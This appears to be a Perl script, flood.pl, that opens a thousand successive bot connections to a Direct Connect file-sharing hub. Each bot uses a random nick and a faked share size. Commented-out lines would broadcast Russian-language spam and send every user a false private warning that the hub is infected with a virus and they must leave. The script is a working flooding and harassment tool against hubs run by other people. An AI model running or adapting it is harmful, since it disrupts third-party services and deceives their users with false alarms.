#!/usr/bin/perl
# $Id$ $URL$
=readme

chat watch 

=cut
use strict;
eval { use Time::HiRes qw(time sleep); };
use lib '../lib';
use Net::DirectConnect::clihub;
print("usage: flood.pl [dchub://]host[:port] [bot_nick]\n"), exit if !$ARGV[0];
#print "Arg=",$ARGV[0],"\n";
$ARGV[0] =~ m|^(?:dchub\://)?(.+?)(?:\:(\d+))?$|;
#print "to=[$1]";
for ( 0 .. 1000 ) {
  #  print "i=$_ $1";
  my $dc = Net::DirectConnect::clihub->new(
    'host' => $1,
    ( $2 ? ( 'port' => $2 ) : () ),
    'Nick' => ( $ARGV[1] or int( rand(100000000) ) ),
    #   'Nick'		=>	'xxxx',
    'sharesize' => int( rand 1000000000000 ) + int( rand 100000000000 ) * int( rand 100 ),
    #   'log'		=>	sub {},	# no logging
    #   'min_chat_delay'	=> 0.401,
    #   'min_cmd_delay'	=> 0.401,
    'client'      => '++',
    'V'           => '0.698',
    'description' => '',
    'M'           => 'P',
  );
  #  print("BOT SEND all\n"),
  #    $dc->cmd( 'chatline', 'Доброго времени суток! Пользуясь случаем, хотим сказать вам: ВЫ Э@3Б@ЛИ СПАМИТЬ!' );
  #  print("BOT SEND to $_\n"), $dc->cmd( 'To', $_, ' HUB заражен вирусом срочно покиньте его!' )
  #    for keys %{ $dc->{'NickList'} };
  while ( $dc->{'socket'} ) {
    #print "w1ds\n";
    $dc->wait_sleep();    #sleep(5); $dc->recv();
  }
  $dc->destroy();
  sleep(1);
}
